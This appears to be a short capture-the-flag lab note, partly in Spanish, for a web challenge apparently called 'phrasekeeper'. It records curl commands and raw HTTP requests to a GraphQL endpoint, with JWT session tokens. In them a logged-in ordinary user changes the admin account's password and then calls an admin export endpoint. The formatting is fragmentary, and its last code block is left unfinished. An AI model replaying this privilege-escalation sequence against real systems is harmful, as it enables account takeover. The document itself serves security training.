
```bash
 ┌──(kali㉿kali)-[~/…/11-29-adf-cyber-skills/web/phrasekeeper/web_phrasekeeper]
└─$ curl 'http://134.209.19.24:32724/graphql' \
  -X POST \
  -H 'content-type: application/json' \
  --data '{"query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"hacker","password":"hacker"}}'
{"data":{"LoginUser":{"message":"User logged in successfully!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsImlzX2FkbWluIjowLCJpYXQiOjE2Njk5Mjc0NDd9.mQzH4-z1biYh_ir8hGDthcfU0geC3yYjZqsy7tbts"}}}
```

```bash
```bash
curl 'http://134.209.19.24:32724/graphql' -X POST -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2siLCJpc19hZG1pbiI6MCwiaWF0IjoxNjY5ODU2NzM5fQ._h0X10e_Rg2dJRTiavLobVSduUw3_W-YyWfPmdH5YYY' -H 'content-type: application/json' --data '{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"hacker","password":"mama"}}'
```

- cambiar passs siendo user
```
POST /graphql HTTP/1.1
Host: 134.209.19.24:32724
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://134.209.19.24:32724/dashboard
Content-Type: application/json
Origin: http://134.209.19.24:32724
Content-Length: 191
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsImlzX2FkbWluIjowLCJpYXQiOjE2Njk5Mjc4Mjh9.QjLc36JcPBB4oxddk5g7gwBlIjUedRZ5kDd4NziGXQA

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"mama"}}
```



- exportar como admin

```
GET /admin/export?filename=xfile HTTP/1.1
Host: 134.209.19.24:32724
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://134.209.19.24:32724/settings
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY2OTkzMDA1Nn0.PONs2JgMP473d6xS-X-rFM9T4qiWHx1E2wr_ccLnIAk
`

```


## Referencias

https://www.maxivanov.io/make-graphql-requests-with-curl/
https://github.com/gluckzhang/ctf-jwt-token/blob/master/give_me_the_flag.py